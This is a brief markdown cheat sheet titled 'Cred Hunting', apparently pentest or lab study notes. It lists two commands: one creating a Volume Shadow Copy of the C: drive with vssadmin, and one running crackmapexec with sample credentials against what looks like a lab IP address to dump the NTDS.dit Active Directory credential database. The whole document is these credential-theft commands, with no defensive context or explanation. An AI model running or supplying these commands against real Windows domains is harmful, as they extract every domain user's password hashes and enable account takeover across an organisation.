# Cred Hunting

## Creating Shadow Copy of C:

```powershell
PS C:\> vssadmin CREATE SHADOW /For=C:
```

## Stealing NTDS.dit using CME

```bash
crackmapexec smb 10.129.201.57 -u amogus -p 1mp0st3r --ntds
```
